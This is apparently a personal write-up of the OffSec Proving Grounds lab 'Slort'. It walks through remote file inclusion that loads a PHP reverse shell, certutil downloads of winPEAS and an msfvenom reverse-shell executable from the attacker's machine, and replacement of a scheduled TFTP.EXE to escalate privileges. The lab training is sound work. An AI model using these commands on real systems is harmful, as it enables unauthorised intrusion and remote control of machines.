---
title: Slort
date: 2026-02-17T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - windows
  - proving-grounds
  - GPO
  - winpeas
  - web
  - include
categories:
  - Pentesting
  - Offsec
  - Windows
description: "This guide provides readers with the solution to the Proving Grounds Lab: Slort"
---
"Do not judge me by my success, judge me by how many times I fell down and got back up again."  
– Nelson Mandela

While I'm waiting for nmap, I checked for http pages. The nmap results show there are a couple of websites on the server. 

![](Screenshot%202026-03-18%20at%2009.08.01.png)

I found a webpage on port 8080

![](Screenshot%202026-03-18%20at%2009.09.08.png)

![](Screenshot%202026-03-18%20at%2009.09.26.png)

A quick gobuster scan showed a few leads. 

![](Screenshot%202026-03-18%20at%2009.10.08.png)

![](Screenshot%202026-03-18%20at%2009.12.05.png)

Usernames...

![](Screenshot%202026-03-18%20at%2009.13.19.png)

jane.simpson
richard.wilson
craig.davidson

I added the number 1 to the address string and got this error. 

![](Screenshot%202026-03-18%20at%2012.06.31.png)

I checked to see if I could load my own referer to the address string. 

![](Screenshot%202026-03-18%20at%2012.07.44.png)

I started a listener from my kali machine. 

`rlwrap nc -lvnp 1234`

![](Screenshot%202026-03-18%20at%2012.09.27.png)

I then created a payload from my favourite site: `revshells.com`

Payload = windows/PHP Ivan Sincek  
IP = {kali IP}  
Port = {1234}

![](Screenshot%202026-03-18%20at%2012.12.39.png)

`http://192.168.246.53:8080/site/index.php/login/index.php?page=http://192.168.45.194/payload.php`

![](Screenshot%202026-03-18%20at%2012.19.14.png)

![](Screenshot%202026-03-18%20at%2012.15.31.png)

I ran winpeas on the victim machine for enumeration. 


Kali:  
`winpeas`  
`python -m http.server 80`


![](Screenshot%202026-03-19%20at%2010.49.15.png)

Victim machine:
`certutil -f -urlcache http://192.168.45.194/winPEASany.exe wp.exe`

![](Screenshot%202026-03-19%20at%2010.48.01.png)


I've used xampp dependencies to get privilege escalation before but this one is really standing out. I spent about 2 hours looking into other attack vectors before finding this as it towards the bottom of the list. 



![](Screenshot%202026-03-19%20at%2011.07.02.png)

Create a payload:

Kali:

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.233 LPORT=1338 -f exe -o TFTP.EXE`

The difference between a staged and unstaged payload it that a staged payload it a smaller file and will connect to metasploit for the next stage in the process. Unstaged has everything it needs to complete the reverse shell connection. I have had a few little fights with this as it looks so similar in the command. I only use unstaged. 

Unstaged > shell_reverse_tcp  
Staged > shell/reverse_tcp

`python -m http.server 80`

Start a listener in a new tab:  
`rlwrap nc -nv 1338`

If you're having issues here, restart the Slort box from the offsec portal. 

Navigate to the backup folder and read the txt files.

Victim:  
`cd c:\Backup`  
`move TFTP.exe BAK`  
`certutil -f -urlcache http://192.168.45.233/TFTP.EXE TFTP.EXE`

Wait up to 5 mins...

![](Screenshot%202026-03-19%20at%2010.45.12.png)

![](Screenshot%202026-03-19%20at%2010.44.29.png)
![](Screenshot%202026-03-19%20at%2010.43.34.png)